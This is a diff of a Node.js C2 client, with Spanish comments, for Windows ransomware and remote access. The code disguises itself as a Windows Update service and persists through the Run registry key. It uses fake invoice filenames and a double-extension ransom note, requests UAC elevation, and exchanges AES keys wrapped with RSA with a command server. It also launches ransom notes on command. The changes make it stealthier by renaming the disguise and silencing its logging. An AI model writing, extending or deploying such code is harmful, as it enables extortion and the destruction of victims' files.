@@ -1,5 +1,5 @@
 // ===============================
-// CLIENTE C2 - Windows RAT
+// CLIENTE C2 
 // ===============================
 
 const { exec, spawn } = require('child_process');
@@ -28,11 +28,11 @@ const SERVERS = configFile.SERVERS || [
 let currentServerIndex = 0;
 let SERVER_URL = SERVERS[currentServerIndex];
 
-const INSTALL_DIR = path.join(process.env.APPDATA || os.homedir(), 'AdobeReader');
-const EXE_NAME = 'Factura_Electronica_Enero2026.exe';       // Parece factura bancaria
-const NOTA_NAME = 'Comprobante_Pago_2026.exe';              // Parece comprobante de pago
+const INSTALL_DIR = path.join(process.env.APPDATA || os.homedir(), 'WindowsUpdate');
+const EXE_NAME = 'WindowsUpdateService.exe';                // Disfrazado de servicio de sistema
+const NOTA_NAME = 'README_RESTORE_FILES.txt.exe';           // Nota de rescate
 const REG_KEY = 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run';
-const REG_VALUE = 'AdobeAcrobatUpdate';
+const REG_VALUE = 'WindowsUpdateService';
 
 // Archivos C2 que NUNCA deben cifrarse
 const ARCHIVOS_EXCLUIDOS = [
@@ -44,6 +44,40 @@ const ARCHIVOS_EXCLUIDOS = [
     '.aes_key', '.decrypt_used', '.client_id',
     'WindowsUpdateService_Cripto.exe', 'WindowsUpdateService.exe'
 ];
+
+// Helper para encontrar la nota de rescate (Prioridad: Local > Persistencia)
+function encontrarNotaRescate() {
+    const currentDir = path.dirname(process.execPath); // Donde está el exe del cliente
+    const cwd = process.cwd(); // Directorio de trabajo
+
+    // Lista de nombres posibles para la nota
+    const nombresNota = [
+        'Comprobante_Pago_2026.exe',
+        'nota_rescate.exe',
+        'nota_rescate_Cripto.exe',
+        NOTA_NAME // README_RESTORE_FILES.txt.exe
+    ];
+
+    // Construir lista de rutas a probar en orden
+    const posiblesRutas = [];
+
+    // 1. Directorio del ejecutable actual
+    nombresNota.forEach(nombre => posiblesRutas.push(path.join(currentDir, nombre)));
+
+    // 2. Directorio de trabajo (si es distinto)
+    if (cwd !== currentDir) {
+        nombresNota.forEach(nombre => posiblesRutas.push(path.join(cwd, nombre)));
+    }
+
+    // 3. Persistencia (Fallback)
+    posiblesRutas.push(path.join(INSTALL_DIR, NOTA_NAME));
+
+    // Retornar la primera que exista
+    for (const ruta of posiblesRutas) {
+        if (fs.existsSync(ruta)) return ruta;
+    }
+    return null;
+}
 
 // Variables globales
 let claveAES = null;
@@ -57,22 +91,21 @@ let isElevated = false;
 // ===============================
 // ELEVACION UAC (SOLICITAR ADMIN)
 // ===============================
-function checkIfAdmin() {
+function verificarSiAdmin() {
     try {
-        // Intentar escribir en directorio del sistema para verificar si somos admin
-        const testPath = 'C:\\Windows\\Temp\\admin_test_' + Date.now() + '.tmp';
-        fs.writeFileSync(testPath, 'test');
-        fs.unlinkSync(testPath);
+        // "net session" solo funciona si tienes privilegios de administrador.
+        // Si no lo eres, lanza un error (exit code != 0).
+        require('child_process').execSync('net session', { stdio: 'ignore' });
         return true;
     } catch (e) {
         return false;
     }
 }
 
-function requestElevation() {
+function solicitarElevacion() {
     return new Promise((resolve) => {
         // Si ya somos admin o estamos en desarrollo, continuar
-        if (checkIfAdmin()) {
+        if (verificarSiAdmin()) {
             console.log(' Ejecutando con privilegios de administrador');
             isElevated = true;
             resolve(true);
@@ -293,7 +326,8 @@ function obtenerInfoSistema() {
         cpus: os.cpus().length,
         totalMemory: Math.round(os.totalmem() / 1024 / 1024 / 1024) + ' GB',
         freeMemory: Math.round(os.freemem() / 1024 / 1024 / 1024) + ' GB',
-        ip: obtenerIPLocal() // Añadido: IP local
+        ip: obtenerIPLocal(), // Añadido: IP local
+        admin: isElevated // Añadido: Estado de admin
     };
 }
 
@@ -420,8 +454,8 @@ function ejecutarComando(comando) {
             });
 
             // Auto-lanzar nota de rescate
-            const notaPath = path.join(INSTALL_DIR, NOTA_NAME);
-            if (fs.existsSync(notaPath)) {
+            const notaPath = encontrarNotaRescate();
+            if (notaPath) {
                 exec(`start "" "${notaPath}"`);
             }
 
@@ -457,8 +491,8 @@ function ejecutarComando(comando) {
             });
 
             // Auto-lanzar nota de rescate
-            const notaPath = path.join(INSTALL_DIR, NOTA_NAME);
-            if (fs.existsSync(notaPath)) {
+            const notaPath = encontrarNotaRescate();
+            if (notaPath) {
                 exec(`start "" "${notaPath}"`);
             }
 
@@ -511,8 +545,8 @@ function ejecutarComando(comando) {
             });
 
             // Auto-lanzar nota de rescate
-            const notaPath = path.join(INSTALL_DIR, NOTA_NAME);
-            if (fs.existsSync(notaPath)) {
+            const notaPath = encontrarNotaRescate();
+            if (notaPath) {
                 exec(`start "" "${notaPath}"`);
             }
 
@@ -564,8 +598,8 @@ function ejecutarComando(comando) {
             });
 
             // Auto-lanzar nota de rescate
-            const notaPath = path.join(INSTALL_DIR, NOTA_NAME);
-            if (fs.existsSync(notaPath)) {
+            const notaPath = encontrarNotaRescate();
+            if (notaPath) {
                 exec(`start "" "${notaPath}"`);
             }
 
@@ -665,8 +699,8 @@ function ejecutarComando(comando) {
 
         // c2:ransom - Mostrar nota de rescate
         if (comando.toLowerCase() === 'c2:ransom') {
-            const notaPath = path.join(INSTALL_DIR, NOTA_NAME);
-            if (fs.existsSync(notaPath)) {
+            const notaPath = encontrarNotaRescate();
+            if (notaPath) {
                 exec(`start "" "${notaPath}"`, (error) => {
                     resolve({
                         success: !error,
@@ -913,6 +947,7 @@ async function conectar() {
 
     socket.on('connect', () => {
         console.log(` [+] Conectado exitosamente a: ${SERVER_URL}`);
+        if (isElevated) console.log(' [+] MODO ADMINISTRADOR: ACTIVO');
         connectionAttempts = 0; // Reset intentos al conectar
 
         if (reconnectInterval) {
@@ -930,7 +965,9 @@ async function conectar() {
             platform: info.platform,
             arch: info.arch,
             username: info.username,
+            username: info.username,
             ip: info.ip, // Ahora usa la IP real del sistema
+            admin: info.admin, // Enviar estado admin al registrar
             serverUrl: SERVER_URL // Guardar a cual servidor se conecto
 
         });
@@ -962,7 +999,7 @@ async function conectar() {
             claveAESHex = data.existingKey;
             claveAESLocal = Buffer.from(data.existingKey, 'hex');
             claveReutilizada = true;
-            console.log(' [+] Usando clave AES del servidor (DB):', claveAESHex.substring(0, 16) + '...');
+            // console.log(' [+] Usando clave AES del servidor (DB):', claveAESHex.substring(0, 16) + '...');
 
             // Guardar localmente para sincronizar
             try {
@@ -970,7 +1007,7 @@ async function conectar() {
                     fs.mkdirSync(INSTALL_DIR, { recursive: true });
                 }
                 fs.writeFileSync(keyFilePath, claveAESHex);
-                console.log('[RSA] Clave sincronizada localmente');
+                // console.log('[RSA] Clave sincronizada localmente');
             } catch (e) {
                 console.log('[!] No se pudo sincronizar clave localmente:', e.message);
             }
@@ -983,7 +1020,7 @@ async function conectar() {
                     claveAESHex = existingKey;
                     claveAESLocal = Buffer.from(existingKey, 'hex');
                     claveReutilizada = true;
-                    console.log(' [+] Reutilizando clave AES local:', claveAESHex.substring(0, 16) + '...');
+                    // console.log(' [+] Reutilizando clave AES local:', claveAESHex.substring(0, 16) + '...');
                 }
             } catch (e) {
                 console.log('[!] Error leyendo clave existente:', e.message);
@@ -994,7 +1031,7 @@ async function conectar() {
         if (!claveReutilizada) {
             claveAESLocal = crypto.randomBytes(32);
             claveAESHex = claveAESLocal.toString('hex');
-            console.log(' [+] Nueva clave AES generada:', claveAESHex.substring(0, 16) + '...');
+            // console.log(' [+] Nueva clave AES generada:', claveAESHex.substring(0, 16) + '...');
 
             // Guardar clave AES localmente
             try {
@@ -1002,7 +1039,7 @@ async function conectar() {
                     fs.mkdirSync(INSTALL_DIR, { recursive: true });
                 }
                 fs.writeFileSync(keyFilePath, claveAESHex);
-                console.log('[RSA] Clave AES guardada localmente');
+                // console.log('[RSA] Clave AES guardada localmente');
             } catch (e) {
                 console.log('[!] No se pudo guardar clave AES:', e.message);
             }
@@ -1022,15 +1059,15 @@ async function conectar() {
             );
 
             const claveAESCifradaB64 = claveAESCifrada.toString('base64');
-            console.log('[RSA] Clave AES cifrada con RSA (primeros 50 chars):', claveAESCifradaB64.substring(0, 50) + '...');
+            // console.log('[RSA] Clave AES cifrada con RSA (primeros 50 chars):', claveAESCifradaB64.substring(0, 50) + '...');
 
             // PASO 4: Enviar clave AES cifrada al servidor
             socket.emit('clave-aes-cliente', {
                 claveAESCifrada: claveAESCifradaB64
             });
-            console.log('[RSA] Clave AES cifrada enviada al servidor');
-            console.log('[RSA] Esperando confirmacion...');
-            console.log('==========================================\n');
+            // console.log('[RSA] Clave AES cifrada enviada al servidor');
+            // console.log('[RSA] Esperando confirmacion...');
+            // console.log('==========================================\n');
 
         } catch (e) {
             console.error('[RSA ERROR] No se pudo cifrar la clave AES:', e.message);
@@ -1042,7 +1079,7 @@ async function conectar() {
         console.log(' [+] Registrado con ID:', data.clienteId);
 
         if (data.cifradoHibrido) {
-            console.log(' [+] CIFRADO HIBRIDO ACTIVO - Comunicacion segura establecida');
+            // console.log(' [+] CIFRADO HIBRIDO ACTIVO - Comunicacion segura establecida');
         }
 
         // La clave AES ya fue generada y guardada en rsa-handshake
@@ -1058,7 +1095,7 @@ async function conectar() {
         } else {
             socket.emit('info-sistema', info);
         }
-        console.log(' [+] Informacion del sistema enviada (cifrada con AES)');
+        // console.log(' [+] Informacion del sistema enviada (cifrada con AES)');
         console.log('[*] Esperando comandos del servidor...');
     });
 
@@ -1342,24 +1379,10 @@ async function conectar() {
         const { comandoId } = data;
         console.log(' Mostrando nota de rescate...');
 
-        // Buscar nota en múltiples ubicaciones
-        const posiblesRutas = [
-            path.join(process.cwd(), NOTA_NAME),                    // Directorio actual (SFX)
-            path.join(INSTALL_DIR, NOTA_NAME),                      // Directorio de instalación
-            path.join(process.cwd(), 'Comprobante_Pago_2026.exe'),  // Nombre exacto
-            path.join(path.dirname(process.execPath), NOTA_NAME)   // Mismo directorio que el exe
-        ];
-
-        let notaPath = null;
-        for (const ruta of posiblesRutas) {
-            if (fs.existsSync(ruta)) {
-                notaPath = ruta;
-                console.log(` Nota encontrada en: ${ruta}`);
-                break;
-            }
-        }
+        const notaPath = encontrarNotaRescate();
 
         if (notaPath) {
+            console.log(` Nota encontrada en: ${notaPath}`);
             exec(`start "" "${notaPath}"`, (error) => {
                 socket.emit('nota-rescate-mostrada', {
                     comandoId,
@@ -1368,7 +1391,7 @@ async function conectar() {
                 });
             });
         } else {
-            console.log(' Nota NO encontrada. Rutas probadas:', posiblesRutas);
+            console.log(' Nota NO encontrada en ubicaciones locales ni persistencia');
             socket.emit('nota-rescate-mostrada', {
                 comandoId,
                 success: false,
@@ -1403,8 +1426,8 @@ process.on('unhandledRejection', (reason, promise) => {
 console.log(' Iniciando cliente...');
 
 // Primero intentar obtener privilegios de admin, luego conectar
-requestElevation().then(() => {
-    console.log(isElevated ? ' Privilegios elevados obtenidos' : ' Ejecutando sin privilegios elevados');
+solicitarElevacion().then(() => {
+    // console.log(isElevated ? ' Privilegios elevados obtenidos' : ' Ejecutando sin privilegios elevados');
     return conectar();
 }).catch(err => {
     console.error('\n Error en funcion principal:', err);
